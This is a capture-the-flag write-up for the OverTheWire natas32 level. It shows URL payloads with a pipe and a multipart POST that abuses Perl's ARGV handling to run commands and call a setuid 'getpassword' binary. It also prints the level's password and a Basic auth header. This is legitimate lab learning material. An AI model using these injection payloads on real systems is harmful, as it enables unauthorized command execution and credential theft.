---
layout: default
title: natas32
---


This time, this is exactly like we talked [natas31](./natas31.md), that we can execute `RCE`

So, let's execute `ls`
* input
> /index.pl?ls%20.%20|
* output
> .:
total 156
drwxr-x--- 5 natas32 natas32 4096 Apr 10 14:18 bootstrap-3.3.6-dist
-rwsrwx--- 1 root natas32 16096 Apr 10 14:18 getpassword
-rw-r--r-- 1 root root 9740 Apr 10 14:18 index-source.html
-r-xr-x--- 1 natas32 natas32 2968 Apr 10 14:18 index.pl
-r-xr-x--- 1 natas32 natas32 97180 Apr 10 14:18 jquery-1.12.3.min.js
-r-xr-x--- 1 natas32 natas32 16877 Apr 10 14:18 sorttable.js
drwxr-x--- 2 natas32 natas32 4096 Jul 11 14:23 tmp

* input
> /index.pl?./getpassword%20|
* output
> 2v9nDlbSF7jvawaCncr5Z9kSzkmBeoCJ

Fine, let's execute get password:
```
POST /index.pl?./getpassword%20| HTTP/1.1
Host: natas32.natas.labs.overthewire.org
Content-Length: 433
Cache-Control: max-age=0
Authorization: Basic bmF0YXMzMjpOYUlXaFcyVklyS3FyYzdhcm9KVkhPWnZrM1JRTWkwQg==
Origin: http://natas32.natas.labs.overthewire.org
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarybY5URDoaIvWBSm4C
Upgrade-Insecure-Requests: 1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://natas31.natas.labs.overthewire.org/index.pl
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9,he;q=0.8
Connection: keep-alive

------WebKitFormBoundarybY5URDoaIvWBSm4C
Content-Disposition: form-data; name="file"; 
Content-Type: application/octet-stream

ARGV
------WebKitFormBoundarybY5URDoaIvWBSm4C
Content-Disposition: form-data; name="file"; filename="sample"
Content-Type: application/octet-stream

bla
------WebKitFormBoundarybY5URDoaIvWBSm4C
Content-Disposition: form-data; name="submit"

Upload
------WebKitFormBoundarybY5URDoaIvWBSm4C--
```
![Flag image](./images/level31.png)

**Flag:** ***`2v9nDlbSF7jvawaCncr5Z9kSzkmBeoCJ`*** 